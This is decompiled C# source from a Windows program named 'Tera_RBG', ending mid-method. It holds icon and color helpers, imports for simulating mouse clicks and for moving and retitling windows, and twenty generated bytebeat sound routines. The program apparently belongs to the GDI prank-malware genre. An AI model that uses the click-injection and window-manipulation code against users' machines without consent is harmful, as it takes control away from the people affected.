using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Tera_RBG
{
	// Token: 0x02000003 RID: 3
	internal class GDI
	{
		// Token: 0x06000008 RID: 8
		[DllImport("Shell32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "ExtractIconExW", ExactSpelling = true)]
		private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);

		// Token: 0x06000009 RID: 9 RVA: 0x0000242C File Offset: 0x0000062C
		public static Icon Extract(string file, int number, bool largeIcon)
		{
			IntPtr intPtr;
			IntPtr intPtr2;
			GDI.ExtractIconEx(file, number, out intPtr, out intPtr2, 1);
			Icon icon;
			try
			{
				icon = Icon.FromHandle(largeIcon ? intPtr : intPtr2);
			}
			catch
			{
				icon = null;
			}
			return icon;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002470 File Offset: 0x00000670
		public static GDI.RGB HSLToRGB(GDI.HSL hsl)
		{
			bool flag = hsl.S == 0f;
			byte b3;
			byte b2;
			byte b;
			if (flag)
			{
				b = (b2 = (b3 = (byte)(hsl.L * 255f)));
			}
			else
			{
				float num = (float)hsl.H / 360f;
				float num2 = (((double)hsl.L < 0.5) ? (hsl.L * (1f + hsl.S)) : (hsl.L + hsl.S - hsl.L * hsl.S));
				float num3 = 2f * hsl.L - num2;
				b2 = (byte)(255f * GDI.HueToRGB(num3, num2, num + 0.33333334f));
				b = (byte)(255f * GDI.HueToRGB(num3, num2, num));
				b3 = (byte)(255f * GDI.HueToRGB(num3, num2, num - 0.33333334f));
			}
			return new GDI.RGB(b2, b, b3);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002574 File Offset: 0x00000774
		private static float HueToRGB(float v1, float v2, float vH)
		{
			bool flag = vH < 0f;
			if (flag)
			{
				vH += 1f;
			}
			bool flag2 = vH > 1f;
			if (flag2)
			{
				vH -= 1f;
			}
			bool flag3 = 6f * vH < 1f;
			float num;
			if (flag3)
			{
				num = v1 + (v2 - v1) * 6f * vH;
			}
			else
			{
				bool flag4 = 2f * vH < 1f;
				if (flag4)
				{
					num = v2;
				}
				else
				{
					bool flag5 = 3f * vH < 2f;
					if (flag5)
					{
						num = v1 + (v2 - v1) * (0.6666667f - vH) * 6f;
					}
					else
					{
						num = v1;
					}
				}
			}
			return num;
		}

		// Token: 0x0600000C RID: 12
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);

		// Token: 0x0600000D RID: 13 RVA: 0x00002618 File Offset: 0x00000818
		public static void DoMouseClick()
		{
			uint x = (uint)Cursor.Position.X;
			uint y = (uint)Cursor.Position.Y;
			GDI.mouse_event(6U, x, y, 0U, 0U);
		}

		// Token: 0x0600000E RID: 14
		[DllImport("user32.dll")]
		private static extern bool SetWindowText(IntPtr hWnd, string text);

		// Token: 0x0600000F RID: 15
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x06000010 RID: 16
		[DllImport("user32.dll", SetLastError = true)]
		internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

		// Token: 0x06000011 RID: 17 RVA: 0x00002650 File Offset: 0x00000850
		public static int GetSomeRandomNumber(int min, int max)
		{
			bool flag = GDI.random == null;
			if (flag)
			{
				GDI.random = new Random();
			}
			return GDI.random.Next(min, max);
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002688 File Offset: 0x00000888
		private static void byte1(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 2; i < array.Length; i++)
				{
					array[i] = (byte)((i * (((i / 2 >> 10) | (i % 16 * i >> 8)) & (82 * i >> 2) & 18)) | (-(i / 16) + 64));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x0000283C File Offset: 0x00000A3C
		private static void byte2(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((i * i + 22) / ((i >> 6) + 23));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000029D4 File Offset: 0x00000BD4
		private static void byte3(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(((91 * i) & (i >> 9)) | ((15 * i) & (i >> 17)) | (((3 * i) & (i >> 5)) - 1));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002B80 File Offset: 0x00000D80
		private static void byte4(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((i * (((i >> 27) | (i >> 13)) & 151)) & 129);
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002D24 File Offset: 0x00000F24
		private static void byte5(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(((((i >> 28) ^ ((i >> 29) - 1) ^ 12) % 123 * i) & 231) * (12 + (i >> 9)));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002ED4 File Offset: 0x000010D4
		private static void byte6(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				int num3 = random.Next(1, 8);
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(i * (i ^ (i + ((i >> 15) | 1)) ^ (((i - 12180) ^ i) >> 10)));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00003088 File Offset: 0x00001288
		private static void byte7(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(430 * ((51 * i >> 11) | (51 * i >> 4)));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003228 File Offset: 0x00001428
		private static void byte8(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				int num3 = random.Next(8);
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(128.0 * Math.Sin((double)(129 * (i >> 10))) + 128.0 * Math.Sin((double)(i * i * i)));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000033F0 File Offset: 0x000015F0
		private static void byte9(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(10 * ((i >> 4) | i | (i >> (i >> 8))) + (37 & (i >> 17)));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003598 File Offset: 0x00001798
		private static void byte10(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((1 + (i >> 3) % 811 + (i >> 31) % 3) * i >> 10);
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x0000373C File Offset: 0x0000193C
		private static void byte11(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((((i >> 3) & 1) * i >> 4) ^ (i / 11118 * i));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000038DC File Offset: 0x00001ADC
		private static void byte12(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((((((i / 8100) | 101) * i) & 815) - i) & (i / 41));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003A84 File Offset: 0x00001C84
		private static void byte13(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(i * (31 + (1 ^ ((i >> 11) & 5))) * (5 + (3 & (i >> 14))) >> (i >> 1));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003C30 File Offset: 0x00001E30
		private static void byte14(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((((((i / 8100) | 110) * i) & 815) - i) & (i / 41));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003DD8 File Offset: 0x00001FD8
		private static void byte15(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(i >> i / (1 + (i >> 1) % 16) * (1 + (3 & (i >> 13))) >> (2 & (i >> 11)));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003F88 File Offset: 0x00002188
		private static void byte16(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((((91 * i) & (i >> 1)) | ((5 * i) & (i >> 7)) | ((31 * i) & (i >> 14))) - 11);
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00004134 File Offset: 0x00002334
		private static void byte17(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(128 * (((int)"2230290303535332929303030290302218182211"[(i >> 12) % 32] * i) & 1912) / 21 + (((int)"020202030"[(i >> 3) % 8] * i >> 1) & 128) + 2128);
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00004304 File Offset: 0x00002504
		private static void byte18(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((i * (((i / 2 >> 10) | (i % 16 * i >> 8)) & (8 * i >> 1) & 18)) | (-(i / 16) + 64));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000044B8 File Offset: 0x000026B8
		private static void byte19(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((i << (i >> 1) % (11 << (71 * ((i >> 1) & (i >> 10) & 13) >> 3))) ^ (i >> 19));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x0000466C File Offset: 0x0000286C
		private static void byte20(int hz, int secs)
		{
			Random random = new Random();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write("RIFF".ToCharArray());
				binaryWriter.Write(0U);
				binaryWriter.Write("WAVE".ToCharArray());
				binaryWriter.Write("fmt ".ToCharArray());
				binaryWriter.Write(16U);
